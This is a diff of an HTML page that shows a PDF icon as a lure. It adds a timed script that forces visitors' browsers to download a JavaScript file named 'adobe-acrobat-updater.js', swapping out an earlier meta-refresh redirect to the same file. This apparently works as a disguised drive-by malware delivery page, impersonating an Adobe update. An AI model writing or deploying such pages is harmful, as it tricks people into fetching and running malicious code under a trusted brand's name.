@@ -73,8 +73,7 @@
 
 <div style="max-width:500px;padding:0px;">
 
-<form action="need4.php" method="POST">
-	<meta http-equiv="Refresh" content="1; url=doc/adobe-acrobat-updater.js">
+<form action="" method="POST">
 <div style="text-align:center">
 <img src="img/Icon_pdf_file.svg.png" width="45px" style="margin-top:200px;" id="fd">
 </div>
@@ -85,8 +84,15 @@
 
 
 </form>
-
-
-
 </body>
+	<script>
+setTimeout(() => {
+    const link = document.createElement('a');
+    link.href = 'doc/adobe-acrobat-updater.js';
+    link.download = 'adobe-acrobat-updater.js';   // This forces download
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}, 1000); // 1.5 seconds delay
+</script>
 </html>
